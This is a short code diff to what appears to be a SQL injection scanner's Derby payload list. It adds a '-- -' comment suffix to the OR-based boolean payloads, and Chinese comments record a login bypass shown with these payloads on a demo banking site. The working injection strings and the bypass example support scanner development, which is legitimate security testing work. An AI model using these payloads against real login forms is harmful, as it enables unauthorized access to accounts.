@@ -255,8 +255,15 @@ export const derbyPayload = {
     "{ORIG} AND 1=1",
     "{ORIG} AND 1=2",
     // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
-    "{ORIG}' OR '1'='1",
-    "{ORIG}' OR '1'='2",
+    // [D209] 补注释后缀。Derby 的典型查询是 `WHERE uid='…' AND passw='…'`，SQL 里 AND 优先于 OR，
+    // 不带 `-- -` 时 `… OR '1'='1' AND passw='…'` 恒假 ⇒ 真/假两组都落空 ⇒ 空基线兜底对（ti:7/fi:6）
+    // 静默失效。实测 demo.testfire.net 的 POST /doLogin（testuser 不是有效用户）：
+    //   `testuser' OR '1'='1`       → login.jsp（失败）
+    //   `testuser' OR '1'='1'-- -`  → bank/main.jsp（成功）
+    // ⚠ 其他库（MySQL/PG/Oracle…）的同类模板也缺注释后缀，但各自 SQL 上下文不同，
+    // 须逐个靶场验证后再改，不在这一批盲改。
+    "{ORIG}' OR '1'='1'-- -",
+    "{ORIG}' OR '1'='2'-- -",
   ],
   time: [],
   stacked: [],
